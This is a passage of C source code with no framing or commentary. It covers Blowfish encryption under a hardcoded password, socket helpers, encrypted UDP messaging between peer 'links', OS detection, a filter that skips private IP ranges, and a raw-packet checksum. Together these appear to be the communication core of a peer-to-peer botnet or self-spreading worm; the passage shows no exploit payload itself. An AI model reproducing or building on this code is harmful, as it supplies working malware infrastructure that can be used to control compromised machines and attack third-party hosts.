		box[i].lastuse=0L;
	}
}

void blowfish_encipher(UWORD_32bits *xl,UWORD_32bits *xr)
{
	union aword  Xl;
	union aword  Xr;

	Xl.word = *xl;
	Xr.word = *xr;

	Xl.word ^= bf_P[0];
	ROUND (Xr, Xl, 1);  ROUND (Xl, Xr, 2);
	ROUND (Xr, Xl, 3);  ROUND (Xl, Xr, 4);
	ROUND (Xr, Xl, 5);  ROUND (Xl, Xr, 6);
	ROUND (Xr, Xl, 7);  ROUND (Xl, Xr, 8);
	ROUND (Xr, Xl, 9);  ROUND (Xl, Xr, 10);
	ROUND (Xr, Xl, 11); ROUND (Xl, Xr, 12);
	ROUND (Xr, Xl, 13); ROUND (Xl, Xr, 14);
	ROUND (Xr, Xl, 15); ROUND (Xl, Xr, 16);
	Xr.word ^= bf_P[17];

	*xr = Xl.word;
	*xl = Xr.word;
}

void blowfish_decipher(UWORD_32bits *xl,UWORD_32bits *xr)
{
	union aword  Xl;
	union aword  Xr;

	Xl.word = *xl;
	Xr.word = *xr;

	Xl.word ^= bf_P[17];
	ROUND (Xr, Xl, 16);  ROUND (Xl, Xr, 15);
	ROUND (Xr, Xl, 14);  ROUND (Xl, Xr, 13);
	ROUND (Xr, Xl, 12);  ROUND (Xl, Xr, 11);
	ROUND (Xr, Xl, 10);  ROUND (Xl, Xr, 9);
	ROUND (Xr, Xl, 8);   ROUND (Xl, Xr, 7);
	ROUND (Xr, Xl, 6);   ROUND (Xl, Xr, 5);
	ROUND (Xr, Xl, 4);   ROUND (Xl, Xr, 3);
	ROUND (Xr, Xl, 2);   ROUND (Xl, Xr, 1);
	Xr.word ^= bf_P[0];

	*xl = Xr.word;
	*xr = Xl.word;
}

void blowfish_init(UBYTE_08bits *key,short keybytes) {
	int i,j,bx; time_t lowest;
	UWORD_32bits  data;
	UWORD_32bits  datal;
	UWORD_32bits  datar;
	union aword temp;

	for (i=0; i<BOXES; i++) if (box[i].P != NULL) {
		if ((box[i].keybytes==keybytes) && (strncmp((char *)(box[i].key),(char *)key,keybytes)==0)) {
			box[i].lastuse=time(NULL);
			bf_P=box[i].P; bf_S=box[i].S;
			return;
		}
	}

	bx=(-1);
	for (i=0; i<BOXES; i++) {
		if (box[i].P==NULL) { bx=i; i=BOXES+1; }
	}
	if (bx<0) {
		lowest=time(NULL);
		for (i=0; i<BOXES; i++) if (box[i].lastuse <= lowest) {
			lowest=box[i].lastuse;
			bx=i;
		}
		myfree(box[bx].P);
		for (i=0; i<4; i++) myfree(box[bx].S[i]);
		myfree(box[bx].S);
	}

	box[bx].P=(UWORD_32bits *)myalloc((bf_N+2)*sizeof(UWORD_32bits));
	box[bx].S=(UWORD_32bits **)myalloc(4*sizeof(UWORD_32bits *));
	if (!box[bx].P) return;
	if (!box[bx].S) return;
	for (i=0; i<4; i++) {
		box[bx].S[i]=(UWORD_32bits *)myalloc(256*sizeof(UWORD_32bits));
		if (!box[bx].S[i]) return;
	}
	bf_P=box[bx].P; bf_S=box[bx].S;
	box[bx].keybytes=keybytes;
	strncpy(box[bx].key,(char*)key,keybytes);
	box[bx].lastuse=time(NULL);

	for (i=0; i<bf_N+2; i++) bf_P[i]=initbf_P[i];
	for (i=0; i<4; i++) for (j=0; j<256; j++) bf_S[i][j]=initbf_S[i][j];

	j = 0;
	for (i = 0; i < bf_N + 2; ++i) {
		temp.word = 0;
		temp.w.byte0 = key[j];
		temp.w.byte1 = key[(j+1)%keybytes];
		temp.w.byte2 = key[(j+2)%keybytes];
		temp.w.byte3 = key[(j+3)%keybytes];
		data = temp.word;
		bf_P[i] = bf_P[i] ^ data;
		j = (j + 4) % keybytes;
	}

	datal = 0x00000000;
	datar = 0x00000000;

	for (i = 0; i < bf_N + 2; i += 2) {
		blowfish_encipher(&datal, &datar);

		bf_P[i] = datal;
		bf_P[i + 1] = datar;
	}

	for (i = 0; i < 4; ++i) {
		for (j = 0; j < 256; j += 2) {
			blowfish_encipher(&datal, &datar);
			bf_S[i][j] = datal;
			bf_S[i][j + 1] = datar;
		}
	}
}

//////////////////////////////////////////////////////////////////////////////////////
//                                My  Blowfish Routines                             //
//////////////////////////////////////////////////////////////////////////////////////

struct crypt_data {
	char *buf;
	unsigned long len,actuallen;
};

struct crypt_data *blowfish_encrypt(char *str,long len) {
	UWORD_32bits left,right;
	char *s,*p,*dest,*d;
	int i;
	unsigned long origlen=len;
	struct crypt_data *a;
	a=(struct crypt_data*)myalloc(sizeof(struct crypt_data));
	if (!a) return NULL;
	a->len=sizeof(a->len);
	dest=(char *)myalloc(len+13+sizeof(a->len));
	if (!dest) return NULL;
	memset(dest,0,len+13+sizeof(a->len));
	dest+=sizeof(a->len);
	s=(char *)myalloc(len+13);
	if (!s) return NULL;
	memset(s,0,len+13);
	memcpy(s,str,len);
	blowfish_init(PASSWORD,strlen(PASSWORD));
	p=s;
	d=dest;
	while (len > 0) {
		((unsigned char*)&right)[3]=(*p++);
		((unsigned char*)&right)[2]=(*p++);
		((unsigned char*)&right)[1]=(*p++);
		((unsigned char*)&right)[0]=(*p++);
		((unsigned char*)&left)[3]=(*p++);
		((unsigned char*)&left)[2]=(*p++);
		((unsigned char*)&left)[1]=(*p++);
		((unsigned char*)&left)[0]=(*p++);
		blowfish_encipher(&left,&right);
		for (i=0; i<4; i++) {
			*d++ = right & 0xff;
			right=(right>>8);
		}
		for (i=0; i<4; i++) {
			*d++ = left & 0xff;
			left=(left>>8);
		}
		len-=8;
		a->len+=8;
	}
	a->actuallen=origlen;
	*d=0;
	myfree(s);
	dest-=sizeof(a->len);
	memcpy(dest,&origlen,sizeof(origlen));
	a->buf=dest;
	return a;
}

struct crypt_data *blowfish_decrypt(char *str,long len) {
	UWORD_32bits left,right;
	char *s,*p,*dest,*d;
	int i;
	struct crypt_data *a;
	long prot=0;
	a=(struct crypt_data*)myalloc(sizeof(struct crypt_data));
	if (!a) return NULL;
	a->len=0;
	dest=(char *)myalloc(len+13);
	if (!dest) return NULL;
	memset(dest,0,len+13);
	s=(char *)myalloc(len+13);
	if (!s) return NULL;
	memset(s,0,len+13);
	memcpy(s,str,len);
	blowfish_init(PASSWORD,strlen(PASSWORD));
	memcpy(&a->len,s,sizeof(a->len));
	if (a->len > len) a->len=len; //EVIL!
	len=a->len;
	p=s+sizeof(a->len);
	d=dest;
	a->actuallen=sizeof(a->len);
	while (len > 0) {
		((unsigned char*)&right)[0]=(*p++);
		((unsigned char*)&right)[1]=(*p++);
		((unsigned char*)&right)[2]=(*p++);
		((unsigned char*)&right)[3]=(*p++);
		((unsigned char*)&left)[0]=(*p++);
		((unsigned char*)&left)[1]=(*p++);
		((unsigned char*)&left)[2]=(*p++);
		((unsigned char*)&left)[3]=(*p++);
		blowfish_decipher(&left,&right);
		for (i=0; i<4; i++) {
			d[3-i] = right & 0xff;
			right=(right>>8);
		}
		d+=4;
		for (i=0; i<4; i++) {
			d[3-i] = left & 0xff;
			left=(left>>8);
		}
		d+=4;
		len-=8;
		prot+=8;
		a->actuallen+=8;
	}
	*d=0;
	myfree(s);
	a->buf=dest;
	return a;
}

void blowfish_destroy(struct crypt_data *a) {
	if (a) {
		myfree(a->buf);
		myfree(a);
	}
}

//////////////////////////////////////////////////////////////////////////////////////
//                               Public routines                                    //
//////////////////////////////////////////////////////////////////////////////////////

void gsrand(unsigned long s) {
	sseed=s;
}
unsigned long grand() {
	sseed=((sseed*965764979)%65535)/2;
	return sseed;
}

#ifndef WIN32
void nas(int a) {
}

int mfork() {
	int parent;
	struct _pids *newpid;
	parent=myfork();
	if (parent == 0) return 0;
	if (parent < 0) return getpid();
	newpid=(struct _pids *)myalloc(sizeof(struct _pids));
	if (!newpid) return parent;
	newpid->id=parent;
	newpid->type=0;
	newpid->next=pids;
	pids=newpid;
	return parent;
}
#endif

char *aerror(struct ainst *inst) {
	if (inst == NULL) return "Invalid instance or socket";
	switch(inst->error) {
		case ASUCCESS:return "Operation Success";
		case ARESOLVE:return "Unable to resolve";
		case ACONNECT:return "Unable to connect";
		case ASOCKET:return "Unable to create socket";
		case ABIND:return "Unable to bind socket";
		case AINUSE:return "Port is in use";
		case APENDING:return "Operation pending";
		case AUNKNOWN:default:return "Unknown";
	}
	return "";
}

int aresolve(char *host) {
 	struct hostent *hp;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		unsigned long a;
		if ((hp = gethostbyname(host)) == NULL) return 0;
		bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
		return a;
	}
	else return inet_addr(host);
}

int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
	unsigned long flag=1;
	struct sockaddr_in in;
	if (inst == NULL) return (AINSTANCE);
	if (inst->sock == 0) {
		inst->error=AINSTANCE;
		return (AINSTANCE);
	}
	inst->len=0;
	in.sin_family = AF_INET;
	if (ip == 0) in.sin_addr.s_addr = INADDR_ANY;
	else in.sin_addr.s_addr = ip;
	in.sin_port = htons(port);
	setsockopt(inst->sock,SOL_SOCKET,SO_REUSEADDR,(void*)&flag,sizeof(flag));
	flag=1;
#ifdef SO_REUSEPORT
	setsockopt(inst->sock,SOL_SOCKET,SO_REUSEPORT,(void*)&flag,sizeof(flag));
#endif
	if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
	inst->error=ASUCCESS;
	return ASUCCESS;
}

int atcp_sync_check(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
#ifdef WIN32
	if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || WSAGetLastError() == WSAEISCONN) {
#else
	if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
#endif
		inst->error=ASUCCESS;
		return (ASUCCESS);
	}
#ifdef WIN32
	if (!(WSAGetLastError() == WSAEALREADY || WSAGetLastError() == WSAEWOULDBLOCK)) {
#else
	if (!(errno == EINPROGRESS ||errno == EALREADY)) {
#endif
		inst->error=ACONNECT;
		return (ACONNECT);
	}
	inst->error=APENDING;
	return (APENDING);
}

int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
	unsigned long flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
#ifdef WIN32
	ioctlsocket(inst->sock, FIONBIO, (unsigned long*)&flag);
#else
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
	unsigned long flag=1;
	unsigned long start;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
#ifdef WIN32
	ioctlsocket(inst->sock, FIONBIO, (unsigned long*)&flag);
#else
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	start=time(NULL);
	while(time(NULL)-start < 10) {
#ifdef WIN32
		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || WSAGetLastError() == WSAEISCONN) {
#else
		errno=0;
		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
#endif
			inst->error=ASUCCESS;
			return (ASUCCESS);
		}
#ifdef WIN32
		if (!(WSAGetLastError() == WSAEALREADY || WSAGetLastError() == WSAEWOULDBLOCK)) break;
#else
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
#endif
		sleep(1);
	}
	inst->error=ACONNECT;
	return (ACONNECT);
}

int atcp_accept(struct ainst *inst,struct ainst *child) {
	int sock;
	unsigned int datalen;
	if (inst == NULL || child == NULL) return (AINSTANCE);
	datalen=sizeof(child->in);
	inst->len=0;
	memcpy((void*)child,(void*)inst,sizeof(struct ainst));
	if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
		memset((void*)child,0,sizeof(struct ainst));
		inst->error=APENDING;
		return (APENDING);
	}
	child->sock=sock;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
#ifdef WIN32
	if ((datalen=send(inst->sock,buf,len,0)) < len) {
		if (WSAGetLastError() == WSAEINPROGRESS) {
#else
	if ((datalen=write(inst->sock,buf,len)) < len) {
		if (errno == EAGAIN) {
#endif
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sendmsg(struct ainst *inst,char *str, ...) {
	static char *textBuffer,tmp[2];
	int ret=-1;
	unsigned long len=3000;
	va_list args;
	va_start(args, str);
#ifdef WIN32
	while(ret == -1) {
		if (textBuffer) myfree(textBuffer);
		textBuffer=(char*)myalloc(len+4);
		if (textBuffer == NULL) return 0;
		memset(textBuffer,0,len+3);
		ret=_vsnprintf(textBuffer, len+1, str, args);
		len+=1000;
	}
#else
	len=vsnprintf(tmp, 2, str, args);
	textBuffer=(char*)myalloc(len+2);
	if (!textBuffer) {
		inst->error=AUNKNOWN;
		return AUNKNOWN;
	}
	memset(textBuffer,0,len+2);
	vsnprintf(textBuffer, len+1, str, args);
#endif
	va_end(args);
	ret=atcp_send(inst,textBuffer,strlen(textBuffer));
	myfree(textBuffer);
	return ret;
}

int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
#ifdef WIN32
	if ((datalen=recv(inst->sock,buf,len,0)) < 0) {
		if (WSAGetLastError() == WSAEINPROGRESS) {
#else
	if ((datalen=read(inst->sock,buf,len)) < 0) {
		if (errno == EAGAIN) {
#endif
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	if (datalen == 0 && len) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
#ifdef WIN32
	if (closesocket(inst->sock) < 0) {
#else
	if (close(inst->sock) < 0) {
#endif
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_listen(struct ainst *inst,unsigned int port) {
	unsigned long flag=1;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	inst->in.sin_family = AF_INET;
	inst->in.sin_addr.s_addr = INADDR_ANY;
	inst->in.sin_port = htons(port);
	setsockopt(inst->sock,SOL_SOCKET,SO_REUSEADDR,(void*)&flag,sizeof(flag));
	flag=1;
#ifdef SO_REUSEPORT
	setsockopt(inst->sock,SOL_SOCKET,SO_REUSEPORT,(void*)&flag,sizeof(flag));
#endif
	if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	flag=1;
	setsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,(void*)&flag,sizeof(flag));
	return (ASUCCESS);
}

int audp_setup(struct ainst *inst,char *host,unsigned int port) {
	unsigned long flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	inst->sock = parent->sock;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_send(struct ainst *inst,char **buf,unsigned long elements,unsigned long *len) {
	long datalen=0;
	char *packet=NULL;
	unsigned long m,packetlen=0;
	struct crypt_data *encrypted;
#ifdef DEBUG
	unsigned long oldaddr=0,oldport=0;
#endif
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
#ifdef DEBUG
	if (inst->in.sin_addr.s_addr == inet_addr("127.0.0.1") && htons(inst->in.sin_port) == PORT) {
		oldport=inst->in.sin_port;
		inst->in.sin_port=htons(myport);
	}
	if(!oldport) for (m=0; servers[m].ip != (char *)0; m++) if (inet_addr(servers[m].ip) == inst->in.sin_addr.s_addr) {
		oldaddr=inst->in.sin_addr.s_addr;
		oldport=inst->in.sin_port;
		inst->in.sin_addr.s_addr=inet_addr("127.0.0.1");
		inst->in.sin_port=htons(servers[m].port);
		break;
	}
	if (elements) Log("%d Sending to %d (%d): ",myport,htons(inst->in.sin_port),oldaddr?oldaddr:inst->in.sin_addr.s_addr);
	for (m=0;m<elements;m++) {
		struct llheader *ll=(struct llheader*)buf[m];
		if (m) Log("%d        ",myport);
		Log("type=%d checksum=%d id=%d cancelation=%d | ",ll->type,ll->checksum,ll->id,ll->cancelation);
		if (len[m] > sizeof(struct llheader) && ll->type == 0) {
			struct header *h=(struct header*)(sizeof(struct llheader)+buf[m]);
			Log("tag=%x id=%d len=%d seq=%d | ",h->tag,h->id,h->len,h->seq);
		}
		Log("\n");
	}
#endif
	for (m=0;m<elements;m++) {
		encrypted=blowfish_encrypt(buf[m],len[m]);
		if (!encrypted) {
			inst->error=AUNKNOWN;
			return AUNKNOWN;
		}
		if (!packet) {
			packet=(char*)myalloc(encrypted->len);
		}
		else {
			packet=(char*)myrealloc(packet,packetlen+encrypted->len);
		}
		memcpy(packet+packetlen,encrypted->buf,encrypted->len);
		packetlen+=encrypted->len;
		blowfish_destroy(encrypted);
	}
	if ((datalen=sendto(inst->sock,packet,packetlen,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) <= 0) {
#ifdef WIN32
		if (WSAGetLastError() == WSAEINPROGRESS) {
#else
		if (errno == EAGAIN) {
#endif
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	myfree(packet);
#ifdef DEBUG
	if (oldaddr) inst->in.sin_addr.s_addr=oldaddr;
	if (oldport) inst->in.sin_port=oldport;
#endif
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len,unsigned long *lens,unsigned long *sizes,unsigned long numlens) {
	long datalen;
	struct crypt_data *decrypted;
	char *packet=NULL;
	unsigned long m,b=0,atlen=0,nlen=0,passes=0;
	if (inst == NULL) return (AINSTANCE);
	nlen=sizeof(inst->in);
	inst->len=0;
	memcpy((void*)client,(void*)inst,sizeof(struct ainst));
	if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(int*)&nlen)) < 0) {
#ifdef WIN32
		if (WSAGetLastError() == WSAEINPROGRESS) {
#else
		if (errno == EAGAIN) {
#endif
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	for (nlen=0;nlen<numlens;nlen++) {
		lens[nlen]=0;
		sizes[nlen]=0;
	}
	nlen=0;
	while(datalen > atlen && passes < numlens) {
		decrypted=blowfish_decrypt(buf+atlen,datalen-atlen);
		if (!decrypted) {
			inst->error=AUNKNOWN;
			return AUNKNOWN;
		}
		if (!packet) {
			packet=(char*)myalloc(decrypted->len);
		}
		else {
			packet=(char*)myrealloc(packet,nlen+decrypted->len);
		}
		memcpy(packet+nlen,decrypted->buf,decrypted->len);
		lens[passes]=nlen;
		sizes[passes]=decrypted->len;
		nlen+=decrypted->len;
		atlen+=decrypted->actuallen;
		blowfish_destroy(decrypted);
		passes++;
	}
	memcpy(buf,packet,len>nlen?nlen:len);
#ifdef DEBUG
	for (m=0; servers[m].ip != (char *)0; m++) if (htons(servers[m].port) == client->in.sin_port) {
		client->in.sin_addr.s_addr=inet_addr(servers[m].ip);
		client->in.sin_port=htons(PORT);
		b=1;
		break;
	}
	Log("%d Receiving from %d (%d): ",myport,b?servers[m].port:htons(client->in.sin_port),client->in.sin_addr.s_addr);
	for (m=0;m<passes;m++) {
		struct llheader *ll=(struct llheader*)(buf+lens[m]);
		if (m) Log("%d        ",myport);
		Log("type=%d checksum=%d id=%d cancelation=%d | ",ll->type,ll->checksum,ll->id,ll->cancelation);
		if (datalen > sizeof(struct llheader) && ll->type == 0) {
			struct header *h=(struct header*)(sizeof(struct llheader)+(buf+lens[m]));
			Log("tag=%x id=%d len=%d seq=%d | ",h->tag,h->id,h->len,h->seq);
		}
		Log("\n");
	}
#endif
	inst->len=passes;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

struct ainst *getwebsite(char *website) {
	int i,d;
	struct ainst *sock;
	char buf[1024],packet[4096];
	unsigned char bufm[2];
	if (strlen(website) >= 1024) return 0;
	sock=(struct ainst*)myalloc(sizeof(struct ainst));
	if (!sock) return NULL;
	memset((void*)sock,0,sizeof(struct ainst));
	memset(buf,0,1024);
	if (!strncmp(website,"http://",7)) strcpy(buf,website+7);
	else strcpy(buf,website);
	for (i=0;i<strlen(buf) && buf[i] != '/';i++);
	buf[i]=0;
	if (atcp_connect(sock,buf,80) != ASUCCESS) return 0;
	memset(packet,0,4096);
	sprintf(packet,"GET /%s HTTP/1.0\r\nConnection: close\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
	if (atcp_send(sock,packet,strlen(packet)) != ASUCCESS) return 0;
	d=0;
	while(d <= 3) {
		fd_set read;
		struct timeval tm;
		FD_ZERO(&read);
		FD_SET(sock->sock,&read);
		memset((void*)&tm,0,sizeof(struct timeval));
		tm.tv_sec=60;
		tm.tv_usec=0;
		if (select(sock->sock+1,&read,NULL,NULL,&tm) <= 0) return 0;
		if (atcp_recv(sock,bufm,1) != 0) return 0;
		if (d == 0) {
			if (*bufm == '\r') d++;
			else d=0;
		}
		else if (d == 1) {
			if (*bufm == '\n') d++;
			else d=0;
		}
		else if (d == 2) {
			if (*bufm == '\r') d++;
			else d=0;
		}
		else if (d == 3) {
			if (*bufm == '\n') d++;
			else d=0;
		}
	}
	return sock;
}

unsigned long _decrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]-=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

unsigned long _encrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]+=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

int useseq(unsigned long seq) {
	unsigned long a;
	if (seq == 0) return 0;
	for (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;
	return 0;
}

unsigned long newseq() {
	unsigned long seq;
	while(1) {
		seq=(rand()*rand())^rand();
		if (useseq(seq)) continue;
		break;
	}
	return seq;
}

void addseq(unsigned long seq) {
	unsigned long i;
	if (seq == 0) return;
	for (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];
	sequence[0]=seq;
}

#define SWAP(a, b) temp=a;a=b;b=temp;

void sort(unsigned long* arr, long arraysize) {
	long i, ir = arraysize - 1, j, k, l = 0;
	unsigned long a,temp;
	int jstack = 0,istack[60];
	for (;;) {
		if (ir - l < 7) {
			for (j = l + 1; j <= ir; j++) {
				a = arr[j];
				for (i = j - 1; i >= l;i--) {
					if (arr[i] <= a) break;
					arr[i+1]=arr[i];
				}
				arr[i+1]=a;
			}
			if (jstack == 0) break;
			ir = istack[jstack--];
			l = istack[jstack--];
		}
		else {
			k = (l+ir) >>1;
			SWAP(arr[k],arr[l+1]);
			if (arr[l] > arr[ir]) {SWAP(arr[l],arr[ir]);}
			if (arr[l+1] > arr[ir]) {SWAP(arr[l+1],arr[ir]);}
			if (arr[l] > arr[l+1]) {SWAP(arr[l],arr[l+1]);}
			i = l+1;	
			j = ir;
			a = arr[l+1];
			for(;;) {
				do i++; while(arr[i] < a);
				do j--; while(arr[j] > a);
				if (j < i) break;
				SWAP(arr[i], arr[j]);
			}
			arr[l+1] = arr[j];
			arr[j] = a;
			jstack += 2;
			if(ir-i+1 >= j-l){
				istack[jstack] = ir;
				istack[jstack-1] = i;
				ir = j - 1;
			} else {
				istack[jstack] = j-1;
				istack[jstack-1] = l;
				l = i;
			}
		}
	}
}

void addserver(unsigned long server) {
	unsigned long *newlinks, i, stop;
	char a=0;
	for (i=0;i<numlinks;i++) if (links[i] == server) a=1;
	if (a == 1 || server == 0) return;
	numlinks++;
	newlinks=(unsigned long*)myalloc((numlinks+1)*sizeof(unsigned long));
	if (!newlinks) return;
	stop=rand()%numlinks;
	for (i=0;i<stop;i++) newlinks[i]=links[i];
	newlinks[i]=server;
	for (;i<numlinks-1;i++) newlinks[i+1]=links[i];
	myfree(links);
	links=newlinks;
	sort(links,numlinks);
}

#ifndef WIN32
int getos() {
	FILE *f=popen("uname","r");
	char os[256];
	if (f == NULL) return UNIX;
	memset(os,0,256);
	fgets(os,256,f);
	while(strlen(os) && (os[strlen(os)-1]=='\n' || os[strlen(os)-1]=='\r')) os[strlen(os)-1]=0;
	if (!strcasecmp(os,"FreeBSD")) return FREEBSD;
	if (!strcasecmp(os,"NetBSD")) return NETBSD;
	if (!strcasecmp(os,"OpenBSD")) return OPENBSD;
	if (!strcasecmp(os,"Linux")) return LINUX;
	if (!strcasecmp(os,"Solaris")) return SOLARIS;
	if (!strcasecmp(os,"IRIX")) return IRIX;
	if (!strcasecmp(os,"HP")) return HP;
	return UNIX;
}
#endif

void conv(char *str,int len,unsigned long server) {
	memset(str,0,len);
	strcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));
}

unsigned long round(float a) {
	unsigned long b=a;
	if (a-b >= 0.5) b++;
	return b;
}

int isreal(unsigned long server) {
	char srv[256];
	unsigned int i,f;
	unsigned char a=0,b=0;
	conv(srv,256,server);
	for (i=0;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	a=atoi(srv);
	f=i+1;
	for (i++;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	b=atoi(srv+f);
	if (a == 127 || a == 10 || a == 0) return 0;
	if (a == 172 && b >= 16 && b <= 31) return 0;
	if (a == 192 && b == 168) return 0;
	return 1;
}

u_short in_cksum(u_short *addr, int len) {
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer =0;
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
